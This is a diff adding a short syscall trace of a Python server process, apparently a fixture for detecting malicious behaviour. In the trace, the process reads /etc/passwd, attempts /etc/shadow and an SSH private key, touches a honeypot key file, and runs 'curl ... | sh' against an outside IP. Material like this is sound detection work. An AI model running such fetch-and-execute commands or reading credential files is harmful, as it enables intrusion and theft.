@@ -1,0 +1,11 @@
+1234  execve("/usr/local/bin/python3", ["python3", "server.py"], 0x7ffd12345678 /* 42 vars */) = 0
+1234  openat(AT_FDCWD, "/usr/lib/python3.10/os.py", O_RDONLY|O_CLOEXEC) = 3
+1234  openat(AT_FDCWD, "/usr/lib/python3.10/json/__init__.py", O_RDONLY|O_CLOEXEC) = 4
+1234  openat(AT_FDCWD, "/app/server.py", O_RDONLY|O_CLOEXEC) = 5
+1234  openat(AT_FDCWD, "/app/data/config.json", O_RDONLY) = 6
+1234  openat(AT_FDCWD, "/etc/passwd", O_RDONLY) = 7
+1234  openat(AT_FDCWD, "/etc/shadow", O_RDONLY) = -1 EACCES (Permission denied)
+1234  openat(AT_FDCWD, "/tmp/honeypot_ssh_key_never_exist", O_RDONLY) = 8
+1234  openat(AT_FDCWD, "/home/user/.ssh/id_rsa", O_RDONLY) = -1 ENOENT (No such file or directory)
+1234  connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("93.184.216.34")}, 16) = 0
+1234  execve("/bin/sh", ["sh", "-c", "curl -s http://93.184.216.34/collect | sh"], 0x7ffd87654321 /* 18 vars */) = 0
